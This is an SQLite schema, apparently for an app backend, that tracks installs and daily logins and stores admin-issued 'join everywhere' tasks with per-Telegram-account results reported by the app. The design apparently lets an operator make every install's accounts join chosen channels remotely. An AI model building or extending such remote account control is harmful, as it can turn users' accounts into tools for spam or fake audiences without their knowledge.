-- One row per app install (random id generated on the phone).
CREATE TABLE IF NOT EXISTS installs (
  id TEXT PRIMARY KEY,
  first_seen INTEGER NOT NULL,
  last_seen INTEGER NOT NULL,
  accounts INTEGER NOT NULL DEFAULT 0,
  build INTEGER NOT NULL DEFAULT 0
);

-- Event counters per UTC day: open, login, logout.
CREATE TABLE IF NOT EXISTS daily (
  day TEXT NOT NULL,
  event TEXT NOT NULL,
  count INTEGER NOT NULL DEFAULT 0,
  PRIMARY KEY (day, event)
);

-- "Join everywhere" tasks created in the admin panel.
CREATE TABLE IF NOT EXISTS join_tasks (
  id INTEGER PRIMARY KEY AUTOINCREMENT,
  kind TEXT NOT NULL,      -- username | invite
  value TEXT NOT NULL,     -- channel username or invite hash
  target TEXT NOT NULL,    -- what the admin typed
  created INTEGER NOT NULL
);

-- One row per task and Telegram account, reported by the app (KiteRemote.java).
CREATE TABLE IF NOT EXISTS join_results (
  task_id INTEGER NOT NULL,
  user_id INTEGER NOT NULL,
  install TEXT NOT NULL,
  name TEXT NOT NULL,
  status TEXT NOT NULL,    -- ok | already | request | captcha | error
  error TEXT,
  at INTEGER NOT NULL,
  PRIMARY KEY (task_id, user_id)
);
